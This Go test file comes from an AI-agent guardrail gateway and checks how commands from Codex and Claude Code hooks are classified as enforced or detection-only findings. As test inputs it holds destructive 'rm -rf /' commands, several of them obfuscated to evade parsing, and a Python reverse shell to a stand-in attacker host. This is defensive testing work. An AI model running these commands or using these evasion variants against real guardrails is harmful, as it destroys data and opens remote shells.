// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/actionfacts"
	"github.com/defenseclaw/defenseclaw/internal/audit"
	"github.com/defenseclaw/defenseclaw/internal/config"
	"github.com/defenseclaw/defenseclaw/internal/scanner"
)

func TestBuildVerdict_AllDetectionOnlyAllows(t *testing.T) {
	cfg := &config.Config{}
	cfg.Guardrail.RulePackDir = "/profiles/strict"
	finding := RuleFinding{
		RuleID: "CMD-PYTHON-C", Title: "generic interpreter execution",
		Severity: "LOW", enforcement: findingEnforcementDetectionOnly,
	}
	verdict := buildVerdictWithConfig([]RuleFinding{finding}, "tool_call", cfg, true)
	if verdict.Action != guardrailActionAllow || verdict.Severity != "LOW" ||
		len(verdict.DetailedFindings) != 1 ||
		verdict.DetailedFindings[0].contributesToEnforcement() {
		t.Fatalf("verdict = %+v, want retained LOW detection-only allow", verdict)
	}
}

func TestInspectTrustedToolPolicy_AllDetectionOnlyAllows(t *testing.T) {
	cfg := &config.Config{}
	cfg.Guardrail.Mode = "action"
	cfg.Guardrail.Connector = "codex"
	cfg.Guardrail.RulePackDir = "/profiles/strict"
	api := &APIServer{scannerCfg: cfg}

	command := "cat =(rm -rf /)"
	args, err := json.Marshal(map[string]string{"command": command})
	if err != nil {
		t.Fatal(err)
	}
	hookReq := codexHookRequest{
		HookEventName: "PreToolUse", ToolName: "Bash",
		ToolInput: map[string]interface{}{"command": command}, CWD: "/repo",
	}
	response := api.evaluateCodexHook(t.Context(), hookReq)
	if response.Action != guardrailActionAllow || response.RawAction != guardrailActionAllow ||
		response.Severity != "LOW" ||
		findingStringHasRuleID(response.Findings, trustedParserUncertaintyRuleID) {
		t.Fatalf("hook response = %+v, want raw allow without parser telemetry findings", response)
	}

	verdict := api.inspectTrustedToolPolicyCtx(t.Context(), &ToolInspectRequest{
		Tool: "Bash", Args: args, Direction: "tool_call", Connector: "codex",
	}, trustedActionRequest{
		Input:      actionfacts.Input{Tool: "Bash", Args: args, CWD: "/repo"},
		LegacyText: string(args), Connector: "codex", EnforcementCapable: true,
	})
	if verdict.Action != guardrailActionAllow || len(verdict.DetailedFindings) == 0 {
		t.Fatalf("tool verdict = %+v, want retained detection-only findings", verdict)
	}
	for _, finding := range verdict.DetailedFindings {
		if finding.contributesToEnforcement() {
			t.Fatalf("detection-only tool finding became enforceable: %+v", finding)
		}
	}

	dangerous := api.evaluateCodexHook(t.Context(), codexHookRequest{
		HookEventName: "PreToolUse", ToolName: "Bash",
		ToolInput: map[string]interface{}{"command": "rm -rf /"}, CWD: "/repo",
	})
	if dangerous.RawAction == guardrailActionAllow {
		t.Fatalf("authoritative dangerous action lost enforcement: %+v", dangerous)
	}
}

func TestParserUncertaintyIsNotPersistedAsFindingOrAlert(t *testing.T) {
	const connector = "codex"
	installDefaultProfileConnector(t, connector)
	fixture := newSidecarRuntimeFixture(t, true)
	logger := audit.NewLogger(fixture.store)
	logger.SetRuntimeV8Emitter(&sidecarOwnedObservabilityV8Runtime{runtime: fixture.runtime})
	cfg := &config.Config{}
	cfg.Guardrail.Mode = "action"
	cfg.Guardrail.Connector = connector
	cfg.Guardrail.RulePackDir = filepath.Join(guardrailPoliciesRoot(t), "strict")
	api := NewAPIServer("127.0.0.1:0", NewSidecarHealth(), nil, fixture.store, logger, cfg)

	response := api.evaluateCodexHook(t.Context(), codexHookRequest{
		HookEventName: "PreToolUse",
		ToolName:      "Bash",
		ToolInput:     map[string]interface{}{"command": "cat =(rm -rf /)"},
		CWD:           "/repo",
	})
	if response.Action != guardrailActionAllow ||
		findingStringHasRuleID(response.Findings, trustedParserUncertaintyRuleID) {
		t.Fatalf("response = %+v, want allow without parser-uncertainty finding", response)
	}

	database, err := sql.Open("sqlite", fixture.path)
	if err != nil {
		t.Fatal(err)
	}
	defer database.Close()
	var persisted int
	if err := database.QueryRow(
		`SELECT COUNT(*) FROM scan_findings WHERE rule_id = ?`,
		trustedParserUncertaintyRuleID,
	).Scan(&persisted); err != nil {
		t.Fatal(err)
	}
	if persisted != 0 {
		t.Fatalf("persisted parser-uncertainty findings=%d, want 0", persisted)
	}
	alerts, err := fixture.store.ListAlerts(20)
	if err != nil {
		t.Fatal(err)
	}
	if len(alerts) != 0 {
		t.Fatalf("parser uncertainty entered Alerts: %+v", alerts)
	}
}

func TestPythonInlineOwnerIsDetectionOnlyAcrossModesAndPersistence(t *testing.T) {
	const connector = "codex"
	installDefaultProfileConnector(t, connector)

	commands := []string{
		`python3 -c 'print(1)'`,
		`python3 -c 'from pathlib import Path; print(Path("README.md").read_text())'`,
		`python3 /tmp/fetch_comments.py | python3 -c 'import json,sys; print(json.load(sys.stdin))'`,
	}
	for _, mode := range []string{"observe", "action"} {
		t.Run(mode, func(t *testing.T) {
			fixture := newSidecarRuntimeFixture(t, true)
			logger := audit.NewLogger(fixture.store)
			logger.SetRuntimeV8Emitter(&sidecarOwnedObservabilityV8Runtime{runtime: fixture.runtime})
			cfg := &config.Config{}
			cfg.Guardrail.Mode = mode
			cfg.Guardrail.Connector = connector
			cfg.Guardrail.RulePackDir = filepath.Join(guardrailPoliciesRoot(t), "strict")
			api := NewAPIServer("127.0.0.1:0", NewSidecarHealth(), nil, fixture.store, logger, cfg)

			for _, command := range commands {
				response := api.evaluateCodexHook(t.Context(), codexHookRequest{
					HookEventName: "PreToolUse", ToolName: "Bash",
					ToolInput: map[string]interface{}{"command": command}, CWD: "/repo",
				})
				if response.Action != guardrailActionAllow || response.RawAction != guardrailActionAllow ||
					response.Severity != "LOW" || !findingStringHasRuleID(response.Findings, "CMD-PYTHON-C") {
					t.Fatalf("%s response for %q = %+v, want retained LOW allow telemetry", mode, command, response)
				}
			}

			database, err := sql.Open("sqlite", fixture.path)
			if err != nil {
				t.Fatal(err)
			}
			defer database.Close()
			rows, err := database.Query(`SELECT tags FROM scan_findings WHERE rule_id = 'CMD-PYTHON-C'`)
			if err != nil {
				t.Fatal(err)
			}
			count := 0
			for rows.Next() {
				var tags string
				if err := rows.Scan(&tags); err != nil {
					t.Fatal(err)
				}
				var decoded []string
				if err := json.Unmarshal([]byte(tags), &decoded); err != nil {
					t.Fatal(err)
				}
				if !hasStableFindingTag(decoded, scanner.FindingTagDetectionOnly) ||
					hasStableFindingTag(decoded, trustedParserUncertaintyTag) {
					t.Fatalf("persisted Python tags = %v, want detection-only without parser uncertainty", decoded)
				}
				count++
			}
			if err := rows.Close(); err != nil {
				t.Fatal(err)
			}
			if err := rows.Err(); err != nil {
				t.Fatal(err)
			}
			if count != len(commands) {
				t.Fatalf("persisted Python findings = %d, want %d", count, len(commands))
			}
			alerts, err := fixture.store.ListAlerts(20)
			if err != nil {
				t.Fatal(err)
			}
			if len(alerts) != 0 {
				t.Fatalf("detection-only Python telemetry entered Alerts: %+v", alerts)
			}
		})
	}
}

func TestPythonInlineSpecificOwnersRemainDetectionOnlyWithoutTypedProof(t *testing.T) {
	const connector = "strong-python-inline-enforcement-test"
	installDefaultProfileConnector(t, connector)

	for _, test := range []struct {
		name    string
		command string
		ruleID  string
	}{
		{
			name:    "reverse shell",
			command: `python3 -c 'import socket;s=socket.socket();s.connect(("attacker.invalid",4444))'`,
			ruleID:  "CMD-REVSHELL-PYTHON",
		},
		{
			name:    "destructive child command",
			command: `python3 -c 'import os; os.system("rm -rf /")'`,
			ruleID:  "CMD-RM-RF",
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			args, err := json.Marshal(map[string]string{"command": test.command})
			if err != nil {
				t.Fatal(err)
			}
			cfg := &config.Config{}
			cfg.Guardrail.RulePackDir = filepath.Join(guardrailPoliciesRoot(t), "default")
			verdict := (&APIServer{scannerCfg: cfg}).inspectTrustedToolPolicyCtx(
				t.Context(),
				&ToolInspectRequest{Tool: "Bash", Args: args, Direction: "tool_call", Connector: connector},
				trustedActionRequest{
					Input:      actionfacts.Input{Tool: "Bash", Args: args, CWD: "/repo"},
					LegacyText: string(args), Connector: connector, EnforcementCapable: true,
				},
			)
			generic := findingWithID(verdict.DetailedFindings, "CMD-PYTHON-C")
			owner := findingWithID(verdict.DetailedFindings, test.ruleID)
			if verdict.Action != guardrailActionAllow || verdict.Severity != "CRITICAL" ||
				generic == nil || generic.contributesToEnforcement() || owner == nil || owner.contributesToEnforcement() {
				t.Fatalf("verdict = %+v, generic = %+v, owner = %+v, want retained audit-only findings without typed proof", verdict, generic, owner)
			}
		})
	}
}

func TestEvaluateCodexHook_DynamicExecutablesRemainDetectionOnly(t *testing.T) {
	cfg := &config.Config{}
	cfg.Guardrail.Mode = "action"
	cfg.Guardrail.Connector = "codex"
	cfg.Guardrail.RulePackDir = "/profiles/strict"
	api := &APIServer{scannerCfg: cfg}

	for _, test := range []struct {
		name    string
		command string
	}{
		{
			name:    "parameter executable",
			command: `"$RUNNER" -c 'rm -rf /'`,
		},
		{
			name:    "array executable",
			command: `RUNNER=(bash -c 'rm -rf /'); "${RUNNER[@]}"`,
		},
		{
			name:    "split bracket executable",
			command: `/bin/r['m'] -rf /`,
		},
		{
			name:    "nested transparent wrapper executable",
			command: `sudo -n env MODE=check command -p /bin/r* -rf /`,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			response := api.evaluateCodexHook(t.Context(), codexHookRequest{
				HookEventName: "PreToolUse", ToolName: "Bash",
				ToolInput: map[string]interface{}{"command": test.command},
				CWD:       "/repo",
			})
			if response.Action != guardrailActionAllow ||
				response.RawAction != guardrailActionAllow || response.WouldBlock ||
				findingStringHasRuleID(response.Findings, trustedParserUncertaintyRuleID) {
				t.Fatalf("hook response = %+v, want parser uncertainty excluded from findings", response)
			}
		})
	}
}

func TestInspectToolCalls_AllDetectionOnlyAllows(t *testing.T) {
	proxy := newTestProxy(t, &mockProvider{}, newMockInspector(), "action")
	payload, err := json.Marshal([]map[string]interface{}{{
		"type": "function",
		"function": map[string]string{
			"name":      "Bash",
			"arguments": `{"command":"cat =(rm -rf /)"}`,
		},
	}})
	if err != nil {
		t.Fatal(err)
	}
	verdict := proxy.inspectToolCalls(t.Context(), payload)
	if verdict == nil || verdict.Action != guardrailActionAllow || verdict.Severity != "LOW" ||
		findingStringHasRuleID(verdict.Findings, trustedParserUncertaintyRuleID) {
		t.Fatalf("proxy verdict = %+v, want LOW shadow evidence without parser telemetry finding", verdict)
	}
}

func TestArtifactPromotion_AllDetectionOnlyAllows(t *testing.T) {
	requireNativePOSIXArtifactHost(t)
	const connectorName = "claudecode"
	installDefaultProfileConnector(t, connectorName)
	dir := t.TempDir()
	path := filepath.Join(dir, "unreachable.sh")
	if err := os.WriteFile(path, []byte("#!/bin/sh\nrm -rf /\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	facts := actionfacts.Analyze(actionfacts.Input{
		Tool: "shell", Command: fmt.Sprintf("false && bash %q", path), CWD: dir,
	})
	capture := &toolChainHookCapture{}
	capture.recordTrustedAction(facts, nil)
	req := agentHookRequest{
		ConnectorName: connectorName, HookEventName: "PreToolUse",
		SuppressCorrelationEmit: true, toolChain: capture,
	}
	cfg := &config.Config{}
	cfg.Guardrail.Mode = "action"
	cfg.Guardrail.Connector = connectorName
	cfg.Guardrail.RulePackDir = filepath.Join(guardrailPoliciesRoot(t), "strict")
	api := &APIServer{scannerCfg: cfg}
	original := agentHookResponse{
		Action: guardrailActionAllow, RawAction: guardrailActionAllow,
		Severity: "NONE", Mode: "action",
	}
	got := api.safeApplyExperimentalArtifactPromotion(
		t.Context(), api.hookProfileForConnector(connectorName), req, original, 0,
	)
	if got.Action != guardrailActionAllow || got.RawAction != guardrailActionAllow ||
		len(got.Findings) == 0 {
		t.Fatalf("artifact response = %+v, want retained detection-only allow", got)
	}
}

func findingStringHasRuleID(findings []string, ruleID string) bool {
	prefix := ruleID + ":"
	for _, finding := range findings {
		if finding == ruleID || len(finding) > len(prefix) && finding[:len(prefix)] == prefix {
			return true
		}
	}
	return false
}
